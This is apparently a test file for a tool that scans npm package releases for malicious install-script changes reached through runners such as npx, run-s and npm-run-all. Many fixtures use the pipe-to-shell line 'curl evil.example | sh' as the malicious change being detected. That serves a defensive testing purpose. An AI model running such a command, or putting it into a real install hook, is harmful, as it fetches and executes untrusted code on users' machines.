import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";
import { setJsScanSteps } from "../src/install-closure.ts";
import { allowFaults } from "./fault-guard.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const holds = (old: FileMap, now: FileMap) => prepass("npm", old, now).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);

// The install hook runs `evil` through a runner; only the text of the script `evil` changes between the two releases, so the
// change is seen only when the runner is followed to that script.
const pkg = (scripts: Record<string, string>) => files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts }) });
const release = (evil: string, hook: string, other = "echo other") => pkg({ postinstall: hook, evil, quiet: "echo hi", other });
const bodyHeld = (hook: string) => holds(release("echo a", hook), release("curl evil.example | sh", hook)).length > 0;
const otherHeld = (hook: string) => holds(release("echo a", hook, "echo one"), release("echo a", hook, "curl evil.example | sh")).length > 0;

// Places where the shell still runs the form.
const PLACES: Record<string, (c: string) => string> = {
  plain: (c) => c,
  "after &&": (c) => `true && ${c}`,
  "after ||": (c) => `false || ${c}`,
  "after ;": (c) => `echo a; ${c}`,
  "if body": (c) => `if true; then ${c}; fi`,
  "if condition": (c) => `if ${c}; then :; fi`,
  "else body": (c) => `if false; then :; else ${c}; fi`,
  "elif body": (c) => `if false; then :; elif true; then ${c}; fi`,
  "f() body": (c) => `f() { ${c}; }; f`,
  "function body": (c) => `function f { ${c}; }; f`,
  "f() subshell body": (c) => `f() (${c}); f`,
  group: (c) => `{ ${c}; }`,
  subshell: (c) => `(${c})`,
  "while condition": (c) => `while ${c}; do break; done`,
  "until condition": (c) => `until ${c}; do :; done`,
  "for body": (c) => `for i in 1; do ${c}; done`,
  "case arm": (c) => `case x in x) ${c};; esac`,
  "negated": (c) => `! ${c}`,
  "if after &&": (c) => `true && if true; then ${c}; fi`,
  "f() body on its own lines": (c) => `f() {\n ${c}\n}\nf`,
};
const ALL = Object.keys(PLACES);
const COMPOUND = ALL.filter((p) => !["plain", "after &&", "after ||", "after ;", "case arm", "f() body on its own lines"].includes(p));

// Each group: the forms, and the places where main did not follow the form to the script (the rows of this change). The other
// places of the same forms already held on main: they are pins.
const groups: { name: string; forms: string[]; missed: string[] }[] = [
  {
    name: "npx running run-s, run-p or npm-run-all",
    forms: ["npx run-s evil", "npx --yes run-s evil", "npx npm-run-all evil", "npx run-p evil", "npx -y npm-run-all -s evil"],
    missed: ["if body", "if condition", "else body", "elif body", "function body", "group", "while condition", "until condition", "for body", "negated", "if after &&"],
  },
  {
    name: "bunx, pnpm dlx and exec, yarn and yarn exec running run-s",
    forms: ["bunx run-s evil", "pnpm dlx run-s evil", "pnpm exec run-s evil", "yarn run-s evil", "yarn exec run-s evil"],
    missed: ALL,
  },
  {
    name: "an npm-run-all mode flag before the name",
    forms: ["npm-run-all -p evil", "npm-run-all --parallel evil", "npm-run-all -s -c evil", "run-p --race evil", "run-s -l evil", "npm-run-all --serial -n evil"],
    missed: COMPOUND.concat("case arm"),
  },
  {
    name: "a directory flag naming this package (yarn --cwd ., pnpm -C ., bun --cwd .)",
    forms: ["yarn --cwd . evil", "yarn --cwd=. evil", "yarn --cwd ./ evil", "yarn --cwd . run evil", "pnpm -C . evil", "pnpm -C . run evil", "pnpm --dir . run evil", "pnpm --dir=./ evil", "bun --cwd . run evil", "bun --cwd=. run evil"],
    missed: COMPOUND.concat("case arm"),
  },
  {
    name: "run-s, run-p and npm-run-all in a function keyword body",
    forms: ["run-s evil", "npm-run-all evil", "run-p evil"],
    missed: ["function body"],
  },
];

describe("a runner form is followed to the script it names wherever the shell runs it", () => {
  for (const g of groups) {
    test(`${g.name}: held where main missed it`, () => {
      for (const c of g.forms) for (const p of g.missed) expect(bodyHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(true);
    });
    const pins = ALL.filter((p) => !g.missed.includes(p));
    if (pins.length > 0) {
      test(`${g.name}: pins, held on main too`, () => {
        for (const c of g.forms) for (const p of pins) expect(bodyHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(true);
      });
    }
  }
  test("pins: a function keyword body with () or on its own lines, held on main too", () => {
    for (const h of ["function f() { run-s evil; }; f", "function f {\n run-s evil\n}\nf"]) expect(bodyHeld(h), h).toBe(true);
  });
});

describe("what does not run this package's script stays out", () => {
  test("a change to another script is quiet for the same forms", () => {
    for (const c of ["npx run-s quiet", "pnpm dlx run-s quiet", "npm-run-all -p quiet", "yarn --cwd . quiet", "pnpm -C . quiet"]) {
      for (const p of ALL) expect(otherHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(false);
    }
  });

  test("yarn, pnpm and bun run a local script named run-s before the binary", () => {
    for (const bin of ["yarn", "pnpm", "bun"]) {
      const hook = `${bin} run-s evil`;
      const s = (evil: string) => pkg({ postinstall: hook, "run-s": "echo harmless", evil });
      expect(holds(s("echo a"), s("curl evil.example | sh")), hook).toEqual([]);
    }
  });

  test("run-s as an argument of another command is not a run", () => {
    for (const hook of ["echo run-s evil > log", "echo run-s evil | cat", "printf %s run-s evil > log"]) expect(bodyHeld(hook), hook).toBe(false);
  });

  test("a wrapped runner moved to another directory does not read this package's script", () => {
    for (const hook of ["npx yarn --cwd sub run-s evil", "npx pnpm --filter=sub exec run-s evil", "npx pnpm -r exec run-s evil", "npx yarn --cwd=sub run-s evil"]) {
      expect(bodyHeld(hook), hook).toBe(false);
    }
  });
});

test("a function keyword line keeps its own reading: it still widens when any file changes", () => {
  const hook = "function f { echo hi; }";
  const s = (v: string) => files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook } }), "a.js": v, "assets/x.bmp": v });
  const h = holds(s("1"), s("2")).join(" ");
  expect(h).toContain("a.js");
  expect(h).toContain("assets/x.bmp");
});

describe("function bodies, local scripts and files named like a runner", () => {
  test("a cd inside a function body does not move the rest of the hook", () => {
    const hook = "function f { cd sub; }; sh x.sh";
    const s = (evil: string) =>
      files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "x.sh": "npm run evil\n", "sub/x.sh": "echo hi\n" });
    expect(holds(s("echo a"), s("curl evil.example | sh")).length).toBeGreaterThan(0);
  });

  test("a local script named like a runner receives the words, it does not run them", () => {
    const hook = "pnpm bun run-s evil";
    const s = (evil: string) => pkg({ postinstall: hook, bun: "echo harmless", evil });
    expect(holds(s("echo a"), s("curl evil.example | sh"))).toEqual([]);
  });

  test("a local file named run-s is not npm-run-all", () => {
    for (const hook of ["pnpm exec ./tools/run-s evil", "yarn ./tools/run-s evil"]) {
      const s = (evil: string) =>
        files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "tools/run-s": "#!/bin/sh\necho hi\n" });
      expect(holds(s("echo a"), s("curl evil.example | sh")), hook).toEqual([]);
    }
  });

  // On a plain line the hook text itself already names the script (as before); in an if body only the follow reads it.
  test("npx with a workspace flag runs in that workspace, so this package's script is not read", () => {
    for (const hook of ["npx --workspace sub run-s evil", "npx -w sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
  });

  // npm keeps the working directory for --prefix and -C but points npm_package_* at the prefix package;
  // which package the runner then reads is left unresolved here, so the follow stops (same as before).
  test("npx with a prefix flag stops the follow", () => {
    for (const hook of ["npx --prefix=sub run-s evil", "npx --prefix sub run-s evil", "npx -C sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
  });
});

// A script first reached with pre and post scripts off (`npm run --ignore-scripts other2`, whose runner reaches evil) is read
// again when a later run reaches it with them on: `npm run evil` runs preevil, so a change to preevil holds.
describe("a script reached first with hooks off is read again with hooks on", () => {
  const scripts = (hook: string, other2: string, preevil: string) => pkg({ postinstall: hook, other2, evil: "echo a", preevil });
  const preHeld = (hook: string, other2: string) =>
    holds(scripts(hook, other2, "echo p"), scripts(hook, other2, "curl evil.example | sh")).length > 0;
  const flagged = "npm run --ignore-scripts other2; npm run evil";
  for (const inner of ["npx run-s evil", "pnpm exec run-s evil", "yarn run-s evil", "bunx run-s evil", "if true; then npx run-s evil; fi"]) {
    test(`held where the follow lost main's hold: other2 = ${inner}`, () => expect(preHeld(flagged, inner)).toBe(true));
  }
  test("held where the follow lost main's hold: npm_config_ignore_scripts=true npm run other2 with pnpm dlx run-s", () => {
    expect(preHeld("npm_config_ignore_scripts=true npm run other2; npm run evil", "pnpm dlx run-s evil")).toBe(true);
  });
  test("held where main missed it: other2 = npm run evil", () => expect(preHeld(flagged, "npm run evil")).toBe(true));
  test("quiet when every run of evil has hooks off", () => {
    expect(preHeld("npm run --ignore-scripts other2; npm run --ignore-scripts evil", "npx run-s evil")).toBe(false);
  });
});

// npm-run-all splits a name from its arguments at the first space and runs that script with the rest.
describe("a run-s name with arguments runs the script before the first space", () => {
  for (const hook of ['npm-run-all --parallel a "evil -- --flag"', 'npx run-s "evil -- --flag"', 'pnpm exec run-s "evil -- --flag"', "run-s 'evil --flag' quiet"]) {
    test(`held where main missed it: ${hook}`, () => expect(bodyHeld(hook)).toBe(true));
  }
  test("held where main missed it: a name after a name with arguments is still read", () => expect(bodyHeld('if true; then run-s "quiet --x" evil; fi')).toBe(true));
  test("a change to another script is quiet", () => expect(otherHeld('npx run-s "evil -- --flag"')).toBe(false));
});

// npm-run-all reads -pcl as -p -c -l (run-s and run-p reject -p; -cln is their combined form) and any --name=value as a config value (--npm-path=x too, only a separate --npm-path
// word names npm), and the run goes on. -l=1 is an invalid option: nothing runs.
describe("run-s flags npm-run-all reads as switches or config values", () => {
  for (const flag of ["-cln", "--race=x", "--max-parallel=2", "--npm-path=./x", "--p:k=v"]) {
    const hook = `if true; then npx run-s ${flag} evil; fi`;
    test(`held where main missed it: ${hook}`, () => expect(bodyHeld(hook)).toBe(true));
  }
  test("an invalid option runs nothing: not followed", () => expect(bodyHeld("if true; then npx run-s -l=1 evil; fi")).toBe(false));
  test("held where main missed it: if true; then npx npm-run-all -pcl evil; fi", () => expect(bodyHeld("if true; then npx npm-run-all -pcl evil; fi")).toBe(true));
});

// The script cap counts distinct scripts: 32 scripts each run once with hooks off and once with them on are 32, not 64.
test("a script run with hooks off and then on counts once toward the script cap", () => {
  const names = Array.from({ length: 32 }, (_, k) => `s${k}`);
  const hook = [...names.map((n) => `npm run --ignore-scripts ${n}`), ...names.map((n) => `npm run ${n}`)].join("; ");
  const mk = (other: string) => pkg({ postinstall: hook, other, ...Object.fromEntries(names.map((n) => [n, "echo hi"])) });
  expect(holds(mk("echo one"), mk("curl evil.example | sh"))).toEqual([]);
});

// npm-run-all runs a name with arguments as `npm run <name> <arguments>`: an argument that moves the run reads as it does there.
describe("a run-s name whose arguments move the run reads as npm run with them", () => {
  const withFile = (hook: string, lib: string) =>
    files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil: "echo a" } }), "lib/x.js": lib, "sub/package.json": "{}" });
  const fileHeld = (hook: string) => holds(withFile(hook, "1"), withFile(hook, "2")).length > 0;
  for (const [hook, plain] of [["if true; then run-s 'evil -w sub'; fi", "if true; then npm run evil -w sub; fi"], ["if true; then run-s 'evil --workspace=sub'; fi", "if true; then npm run evil --workspace=sub; fi"]] as const) {
    test(`widens like npm run, where main did not: ${hook}`, () => {
      expect(fileHeld(plain)).toBe(true);
      expect(fileHeld(hook)).toBe(true);
    });
  }
  test("a name with no arguments does not widen", () => expect(fileHeld("if true; then run-s evil; fi")).toBe(false));
});

// npm-run-all 4.1.5 sets the npm path from the word --npm-path and the NEXT argument, and runs that file as npm (a .js or .mjs value under
// node). --npm-path=x is only a config value there; it is read too, as a harmless extra.
describe("run-s --npm-path <file> runs that file as npm", () => {
  const withNpm = (hook: string, body: string, name = "tools/npm") =>
    files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil: "echo a" } }), [name]: body, "lib/other": "echo hi" });
  const pathHeld = (hook: string, name?: string) => holds(withNpm(hook, "echo one", name), withNpm(hook, "curl evil.example | sh", name)).length > 0;
  for (const hook of [
    "npm-run-all --npm-path tools/npm evil",
    "npm-run-all --npm-path ./tools/npm evil",
    "run-p --npm-path ./tools/../tools/npm evil",
    "npm-run-all -p --npm-path tools/npm evil",
        "npm-run-all --npm-path=./tools/npm evil",
  ]) {
    test(`held where base released it: ${hook}`, () => expect(pathHeld(hook)).toBe(true));
  }
  for (const [hook, name] of [["npm-run-all --npm-path lib/run.js evil", "lib/run.js"], ["npm-run-all --npm-path lib/run.mjs evil", "lib/run.mjs"]] as const) {
    test(`a script value is held: ${hook}`, () => expect(pathHeld(hook, name)).toBe(true));
  }
  test("pin: the npx form already held on base", () => expect(pathHeld("if true; then npx run-s --npm-path tools/npm evil; fi")).toBe(true));
  test("pin: an unresolved value reads every file", () => expect(pathHeld("N=tools/npm; npm-run-all --npm-path $(echo tools/npm) evil")).toBe(true));
  test("pin: an unresolved --npm-path= value reads every file", () => expect(pathHeld("npm-run-all --npm-path=$(echo tools/npm) evil")).toBe(true));
  test("another file named is quiet", () => expect(pathHeld("npm-run-all --npm-path ./lib/other evil")).toBe(false));
  test("another file named with = is quiet", () => expect(pathHeld("npm-run-all --npm-path=./lib/other evil")).toBe(false));
  test("a flag with no path is not a file", () => expect(pathHeld("npm-run-all --max-parallel=2 evil")).toBe(false));
  test("--max-parallel 1 is not a file", () => expect(pathHeld("npm-run-all --max-parallel 1 evil")).toBe(false));

  // The read of a value must not make the later commands skip their own reads: base reads sub/near.js after `cd sub` and holds when the
  // scan budget runs out on it; a value that leaves the package must not switch that off.
  describe("a value that leaves the package leaves the later commands' reads alone", () => {
    const near = (hook: string, ver: string) =>
      files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, build: "echo b" } }), "sub/near.js": "var a = 1;\n".repeat(300), "lib/a.js": "1" });
    const nearHeld = (hook: string, limit: number) => {
      setJsScanSteps(limit);
      try {
        return holds(near(hook, "1.0.0"), near(hook, "1.0.1")).length > 0;
      } finally {
        setJsScanSteps(undefined);
      }
    };
    for (const limit of [50, 200, 800, 3000]) {
      for (const value of ["../../x", "../x", "$NPM"]) {
        test(`held as with no flag, limit ${limit}: --npm-path ${value}`, () => {
          allowFaults(); // the scan budget runs out on near.js on purpose
          const plain = nearHeld("npm-run-all build; cd sub; node near.js; node lib/x.js", limit);
          expect(plain).toBe(true);
          expect(nearHeld(`npm-run-all --npm-path ${value} build; cd sub; node near.js; node lib/x.js`, limit)).toBe(plain);
          expect(nearHeld(`npm-run-all --npm-path=${value} build; cd sub; node near.js; node lib/x.js`, limit)).toBe(plain);
        });
      }
    }
  });
  test("a glob value widens and still reads the script names after it", () => expect(pathHeld("npm-run-all --npm-path=tools/? evil")).toBe(true));
  // The file's own hold comes after the cap block: a changed --npm-path file adds `file tools/npm` to the details base gives and drops none.
  describe("a changed --npm-path file keeps the details base gives", () => {
    const withReadme = (hook: string, body: string, readme = "r") =>
      files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, a1: "echo a", evil: "echo a" } }), "tools/npm": body, "README.md": readme, "lib/other": "echo hi" });
    const star = "tools/" + "*".repeat(300);
    for (const hook of [
      "npm-run-all --npm-path=tools/npm 'a?'",
      "npm-run-all --npm-path=tools/npm x; node a?.js",
      `npm-run-all --npm-path=tools/npm '${star}'`,
    ]) {
      test(`details are base's plus the file: ${hook.slice(0, 60)}`, () => {
        const same = holds(withReadme(hook, "x"), withReadme(hook, "x"));
        const changed = holds(withReadme(hook, "x"), withReadme(hook, "y"));
        expect([...changed].sort()).toEqual([...new Set([...same, "file tools/npm"])].sort());
        expect(same.length).toBeGreaterThan(0);
      });
    }
    test("a widening value with only README.md changed keeps its details", () => {
      const hook = "npm-run-all --npm-path=tools/? 'a?'";
      const same = holds(withReadme(hook, "x"), withReadme(hook, "x", "r2"));
      const changed = holds(withReadme(hook, "x"), withReadme(hook, "y", "r2"));
      expect([...changed].sort()).toEqual([...new Set([...same, "file tools/npm"])].sort());
    });
  });
  test("a second --npm-path after one that ends the run is read too", () => expect(pathHeld("npm-run-all --npm-path lib/other --npm-path tools/npm evil")).toBe(true));

  // A hold the read's own scan raises is kept: the scan marks the file scanned, so a later command that names it would not raise it again.
  describe("a scan hold raised while reading the value is kept", () => {
    const sized = (hook: string, ver: string, extra: Record<string, string> = {}) =>
      files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, build: "echo b" } }), "sub/near.js": "var a = 1;\n".repeat(300), "lib/x.js": "1", "lib/y.js": "1", ...extra });
    const bumpHeld = (hook: string, limit?: number, extra?: Record<string, string>) => {
      setJsScanSteps(limit);
      try {
        return holds(sized(hook, "1.0.0", extra), sized(hook, "1.0.1", extra)).length > 0;
      } finally {
        setJsScanSteps(undefined);
      }
    };
    // Budget: the hold is the scanner running out on a 300-line file, whichever way it is named.
    for (const limit of [1, 50, 200, 800, 3000, 20000]) {
      for (const hook of [
        "npm-run-all --npm-path sub/near.js build; cd sub; node near.js",
        "npm-run-all --npm-path=sub/near.js build; cd sub; node near.js",
        "npm-run-all -s --npm-path sub/near.js build; cd sub; node near.js",
        "npm-run-all --npm-path '*' build; cd sub; node near.js",
        "npm-run-all --npm-path 'lib/*' build; cd sub; node near.js",
        "npx npm-run-all --npm-path sub/near.js build",
        "npm-run-all --npm-path sub/near.js build; node sub/near.js",
      ]) {
        test(`held at limit ${limit}: ${hook}`, () => {
          allowFaults();
          expect(bumpHeld(hook, limit)).toBe(true);
        });
      }
    }
    // No budget: a file that reads the manifest config through a variable is held by its scan.
    for (const hook of ["npm-run-all --npm-path lib/m.js build; node lib/m.js", "npm-run-all --npm-path=lib/m.js build; node lib/m.js", "npm-run-all --serial --npm-path lib/m.js build; node lib/m.js", "run-p --npm-path lib/m.js build; node lib/m.js", "npx npm-run-all --npm-path lib/m.js build; node lib/m.js"]) {
      test(`held on the manifest read: ${hook}`, () => expect(bumpHeld(hook, undefined, { "lib/m.js": "var x = process.env.npm_package_config_f + 'y';" })).toBe(true));
    }
  });
  test("a value that starts with - does not end the reading of the next --npm-path", () => expect(pathHeld("npm-run-all --npm-path -x --npm-path tools/npm evil")).toBe(true));
  test("after -- the words are script arguments: not read as the npm path", () => expect(pathHeld("npm-run-all evil -- --npm-path tools/npm")).toBe(false));
  test("a glob value widens past the inert folders", () => {
    const mk = (ver: string, body: string) => files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: "npm-run-all --npm-path=tools/? evil", evil: "echo a" } }), "docs/x.js": body });
    expect(holds(mk("1.0.0", "1"), mk("1.0.1", "2")).length > 0).toBe(true);
  });
  test("an unresolved value in a folder reads the folder", () => {
    const mk = (ver: string, body: string) => files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: "npm-run-all --npm-path tools/$N evil", evil: "echo a" } }), "tools/npm": body });
    expect(holds(mk("1.0.0", "1"), mk("1.0.1", "2")).length > 0).toBe(true);
  });

  // The read of the value must not change what a later command reads: it runs on records of its own (underOwnMarks) and caches nothing.
  describe("the read of the value leaves the shared scan state to the later commands", () => {
    const run = (mk: (ver: string) => FileMap, limit?: number) => {
      setJsScanSteps(limit);
      try {
        return holds(mk("1.0.0"), mk("1.0.1")).length > 0;
      } finally {
        setJsScanSteps(undefined);
      }
    };
    const man = (ver: string, hook: string, main?: string) => JSON.stringify({ name: "p", version: ver, main, scripts: { postinstall: hook, build: "echo b" } });
    for (const flag of ["--npm-path lib/dyn.js", "--npm-path=lib/dyn.js"]) {
      // The value was scanned and marked first; `node lib/static.js` then did not harvest the literals the later `node lib/dyn.js` reaches.
      test(`a changed file a later script names is still read: ${flag}`, () => {
        const hook = `npm-run-all ${flag} build; node lib/static.js; node lib/dyn.js`;
        const mk = (secret: string) => (ver: string) =>
          files({ "package.json": man(ver, hook), "lib/dyn.js": "require('./a/' + process.platform);", "lib/static.js": 'const p = "docs/secret.js";', "docs/secret.js": secret });
        expect(holds(mk("1")("1.0.0"), mk("2")("1.0.1")).length > 0).toBe(true);
      });
    }
    // The value widened the files, which hid a manifest-only retarget of main (this row can depend on OUP-305).
    for (const flag of ["--npm-path=docs/b.js", "--npm-path=tools/?", "--npm-path ../../x"]) {
      test(`a retarget of main is still seen: ${flag}`, () => {
        const hook = `npx . ; npm-run-all ${flag} build`;
        const from = flag.includes("docs/b") ? "lib/ok.js" : "docs/a.js";
        const mk = (ver: string, main: string) => files({ "package.json": man(ver, hook, main), "lib/ok.js": "1", "docs/a.js": "1", "docs/b.js": "1" });
        expect(holds(mk("1.0.0", from), mk("1.0.1", "docs/b.js")).length > 0).toBe(true);
      });
    }
    // The value's own scan cached the literals of nothing the later commands then read for free.
    for (const limit of [400, 450, 500, 600, 799]) {
      test(`a later command pays for its own reads, limit ${limit}`, () => {
        allowFaults();
        const hook = "sh lib/a.sh; npm-run-all --npm-path tools/npm build; ./tools/run";
        const mk = (ver: string) => files({ "package.json": man(ver, hook), "lib/a.sh": " ".repeat(100), "tools/npm": "", "tools/run": " ".repeat(100) });
        expect(run(mk, limit)).toBe(true);
      });
    }
  });

  // npm-run-all takes the next word as the value whatever it is: `--` and a dash-prefixed word too. The file only has to count as read, so a
  // basename with any dot reads the same as one with none.
  describe("the value is the next word, whatever it starts with, and the file counts as read", () => {
    const withFile = (hook: string, name: string, body: string, ver = "1.0.0") =>
      files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, evil: "echo a" } }), [name]: body, "docs/payload.js": "1" });
    const changed = (hook: string, name: string) => holds(withFile(hook, name, "#!/bin/sh\nnode docs/payload.js\n"), withFile(hook, name, "#!/bin/sh\ncurl evil.example | sh\n", "1.0.1")).length > 0;
    test("`--` is consumed as the value and the next --npm-path is read", () => expect(changed("npm-run-all --npm-path -- --npm-path tools/npm evil", "tools/npm")).toBe(true));
    test("a dash-prefixed value is a relative path", () => expect(changed("npm-run-all --npm-path -tools/npm evil", "-tools/npm")).toBe(true));
    test("a dash-prefixed value after a first one is read", () => expect(changed("npm-run-all --npm-path safe --npm-path -tools/npm evil", "-tools/npm")).toBe(true));
    for (const name of ["tools/npm.v1", "tools/npm.exe", "tools/npm.d/run"]) {
      test(`a basename with a dot is read: ${name}`, () => expect(changed(`npm-run-all --npm-path ${name} evil`, name)).toBe(true));
      test(`a basename with a dot is read, = form: ${name}`, () => expect(changed(`npm-run-all --npm-path=${name} evil`, name)).toBe(true));
    }
    test("many repeated flags are read in one pass", () => {
      const hook = `npm-run-all ${Array.from({ length: 400 }, (_, k) => `--npm-path ../x${k}`).join(" ")} evil`;
      const t0 = performance.now();
      changed(hook, "tools/npm");
      expect(performance.now() - t0).toBeLessThan(4000);
    });
  });
  // After a cd the value is a path from that folder.
  describe("a value after a cd names a file of that folder", () => {
    const mk = (hook: string, body: string, ver = "1.0.0") => files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, evil: "echo a" } }), "docs/sub/npm": body, "docs/other": "1" });
    const cdHeld = (hook: string) => holds(mk(hook, "echo one"), mk(hook, "curl evil.example | sh", "1.0.1")).length > 0;
    test("cd docs/sub; --npm-path npm", () => expect(cdHeld("cd docs/sub; npm-run-all --npm-path npm evil")).toBe(true));
    test("cd docs/sub; --npm-path=./npm", () => expect(cdHeld("cd docs/sub; npm-run-all --npm-path=./npm evil")).toBe(true));
    test("cd .. then a value reads past the package", () => expect(cdHeld("cd ..; npm-run-all --npm-path npm evil")).toBe(true));
  });
  // On a line with a backslash main reads nothing and every real read is the backslash reading's: the value's records must not mix into it
  // and hide a manifest-only retarget of main.
  describe("a retarget of main is still seen on a line with a backslash", () => {
    const mk = (hook: string, ver: string, main: string) =>
      files({ "package.json": JSON.stringify({ name: "p", version: ver, main, scripts: { postinstall: hook, build: "echo b", evil: "echo e" } }), "lib/ok.js": "1", "docs/b.js": "1" });
    const retargeted = (hook: string) => holds(mk(hook, "1.0.0", "lib/ok.js"), mk(hook, "1.0.1", "docs/b.js")).length > 0;
    for (const hook of [
      "npx . ; npm-run-all --npm-path=docs/b.js build; echo a\\b",
      "npx . ; npm-run-all --npm-path docs/b.js build; echo a\\b",
      "\\npm-run-all --npm-path=docs/b.js evil; npx .",
      "npm-run-all --npm-path tools\\npm evil; npx .",
      "\\npm-run-all --npm-path=../x evil; npx .",
      "\\npm-run-all --npm-path=tools/? evil; npx .",
      "npx . ; run-p --npm-path=docs/b.js build; echo a\\b",
      "npx . ; npx run-p --npm-path=docs/b.js build; echo a\\b",
      "npx . ; pnpm exec run-s --npm-path=docs/b.js build; echo a\\b",
      "npx . ; npx --yes npm-run-all --npm-path=docs/b.js build; echo a\\b",
      "npx . ; npm-run-all --npm-path -- --npm-path docs/b.js build; echo a\\b",
      "npx . ; npm-run-all --npm-path=docs/b.js --npm-path=docs/b.js build; echo a\\b",
    ]) {
      test(`held as without the backslash: ${hook}`, () => expect(retargeted(hook)).toBe(true));
    }
    // A retarget of main behind `npx run-p ... ../x` is held since OUP-305 (the narrow read of a widening file shows it); the backslash reading's
    // own record must not hide it.
    test("a retarget of main behind npx run-p with a value outside the package is held", () => {
      const m = (ver: string, main: string) => mk("npx . ; npx run-p --npm-path ../x build; echo a\\b", ver, main);
      expect(holds(m("1.0.0", "lib/ok.js"), m("1.0.1", "docs/b.js")).length > 0).toBe(true);
    });
    test("pin: the same line without the backslash holds", () => expect(retargeted("npx . ; npm-run-all --npm-path=docs/b.js build; echo a")).toBe(true));
  });
  // A value that cannot be told to name one file of the package widens every file, the inert folders too.
  describe("a value that names no one file of the package widens", () => {
    const mk = (hook: string, body: string, ver = "1.0.0") => files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, evil: "echo a" } }), "docs/x.js": body });
    const widened = (value: string) => {
      const hook = `npm-run-all --npm-path ${value} evil`;
      return holds(mk(hook, "1"), mk(hook, "2", "1.0.1")).length > 0;
    };
    for (const value of ["C:/npm", "c:\\\\npm", "..", "../x", "a/..", "./", ".", "$NPM", "~/npm", "tools\\\\npm", "/usr/bin/npm", "tools/?", "'tools/*'"]) {
      test(`widens: --npm-path ${value}`, () => expect(widened(value)).toBe(true));
    }
    test("a plain file of the package does not widen the inert folders", () => expect(widened("tools/npm")).toBe(false));
  });
  // Cost: each command with a value that widens, or names a file, must not redo what an earlier one did (commands x files).
  describe("many commands with --npm-path values cost one widen, not one per command", () => {
    const many = (value: string, commands: number, nfiles: number) => {
      // (the unresolved and outside-the-package values widen every file; a file of the package is marked once)
      const hook = Array.from({ length: commands }, () => `npm-run-all --npm-path=${value} build`).join("; ");
      const mk = (ver: string) =>
        new Map<string, Uint8Array>([["package.json", enc(JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, build: "echo b" } }))], ...Array.from({ length: nfiles }, (_, k) => [`lib/f${k}.js`, enc("1")] as [string, Uint8Array])]);
      const t0 = performance.now();
      const h = holds(mk("1.0.0"), mk("1.0.1"));
      return { ms: performance.now() - t0, held: h.length > 0 };
    };
    test("an unresolved value, 20,000 commands over 2,000 files", () => expect(many("$X", 20000, 2000).ms).toBeLessThan(2000));
    test("a value outside the package, 20,000 commands over 2,000 files", () => expect(many("../x", 20000, 2000).ms).toBeLessThan(2000));
    test("a file of the package, 20,000 commands over 8,000 files", () => expect(many("lib/f1.js", 20000, 8000).ms).toBeLessThan(4000));
  });
});

// The files a --npm-path value names are a record of their own: they must neither share the record of a bare `((` widening nor take the
// widen key the backslash reading shares (both made a retarget of main release).
describe("a --npm-path read is on a record of its own", () => {
  const mk = (ver: string, main: string, hook: string, bodies: Record<string, string>) =>
    files({ "package.json": JSON.stringify({ name: "p", version: ver, main, scripts: { postinstall: hook, build: "echo b" } }), "lib/ok.js": "1", "docs/c.js": "1", ...bodies });
  const retarget = (hook: string, bodies: Record<string, string>) => holds(mk("1.0.0", "lib/ok.js", hook, bodies), mk("1.0.1", "lib/b.js", hook, bodies));
  const ARITH = { "lib/b.js": "#!/bin/sh\nread x; (( x == 0 ))\n" };
  const ENV_S = { "lib/b.js": "#!/usr/bin/env -S node --test\n" };
  for (const value of ["--npm-path docs/c.js", "--npm-path=docs/c.js", "--npm-path=../x"]) {
    test(`a bare (( widening of main still shows: ${value}`, () => expect(retarget(`npx . ; npm-run-all ${value} build`, ARITH).length).toBeGreaterThan(0));
  }
  for (const hook of ["npm-run-all --npm-path=../x build; npx . ; echo a\\b", "npm-run-all --npm-path ../x build; npx . ; echo a\\b", "\\npm-run-all --npm-path=../x build; npx ."]) {
    test(`a widening value does not take the backslash reading's widen: ${hook}`, () => expect(retarget(hook, ENV_S).length).toBeGreaterThan(0));
  }
  test("the named file still holds when its bytes change", () => {
    const hook = "npm-run-all --npm-path docs/c.js build";
    expect(holds(mk("1.0.0", "lib/ok.js", hook, {}), mk("1.0.1", "lib/ok.js", hook, { "docs/c.js": "2" })).length).toBeGreaterThan(0);
  });
  test("an unchanged named file is quiet", () => {
    const hook = "npm-run-all --npm-path docs/c.js build";
    expect(holds(mk("1.0.0", "lib/ok.js", hook, {}), mk("1.0.1", "lib/ok.js", hook, {})).length).toBe(0);
  });
  // What the value names, on one side only or on a bump-only release.
  describe("what a value names when a side lacks it, and a release that only bumps the version", () => {
    const hookOf = (value: string, tail = "") => `npm-run-all --npm-path ${value} build${tail}`;
    const rel = (ver: string, hook: string, extra: Record<string, string>) =>
      files({ "package.json": JSON.stringify({ name: "p", version: ver, scripts: { postinstall: hook, build: "echo b" } }), "lib/ok.js": "1", ...extra });
    const held = (hook: string, a: Record<string, string>, b: Record<string, string>) => holds(rel("1.0.0", hook, a), rel("1.0.1", hook, b)).length > 0;
